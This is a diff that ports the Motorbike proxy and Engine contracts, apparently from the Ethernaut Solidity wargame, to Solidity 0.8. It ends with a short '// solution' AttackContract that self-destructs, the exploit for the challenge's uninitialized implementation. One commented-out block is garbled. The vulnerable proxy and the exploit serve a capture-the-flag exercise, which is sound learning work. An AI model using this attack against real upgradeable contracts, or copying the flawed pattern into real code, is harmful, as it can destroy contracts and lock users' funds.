@@ -1,8 +1,10 @@
 // SPDX-License-Identifier: MIT
-pragma solidity <0.7.0;
+pragma solidity ^0.8.0;
 
-import "openzeppelin-contracts-06/utils/Address.sol";
-import "openzeppelin-contracts-06/proxy/Initializable.sol";
+import "./Initializable.sol";
+
+// old version
+// import "openzeppelin-contracts-06/utils/Address.sol";
 
 contract Motorbike {
     // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
@@ -14,9 +16,13 @@ contract Motorbike {
     }
 
     // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
-    constructor(address _logic) public {
-        require(
+    constructor(address _logic) {
+        /*         require(
             Address.isContract(_logic),
+            "ERC1967: new implementation is not a contract"
+        ); */
+        require(
+            _logic.code.length > 0,
             "ERC1967: new implementation is not a contract"
         );
         _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
@@ -61,7 +67,7 @@ contract Motorbike {
         bytes32 slot
     ) internal pure returns (AddressSlot storage r) {
         assembly {
-            r_slot := slot
+            r.slot := slot
         }
     }
 }
@@ -113,15 +119,27 @@ contract Engine is Initializable {
 
     // Stores a new address in the EIP1967 implementation slot.
     function _setImplementation(address newImplementation) private {
-        require(
+        /*         require(
             Address.isContract(newImplementation),
+            newImplementation.code.length > 0,
+            "ERC1967: new implementation is not a contract"f
+        ); */
+        require(
+            newImplementation.code.length > 0,
             "ERC1967: new implementation is not a contract"
         );
 
         AddressSlot storage r;
         assembly {
-            r_slot := _IMPLEMENTATION_SLOT
+            r.slot := _IMPLEMENTATION_SLOT
         }
         r.value = newImplementation;
+    }
+}
+
+// solution
+contract AttackContract {
+    constructor() {
+        selfdestruct(payable(msg.sender));
     }
 }
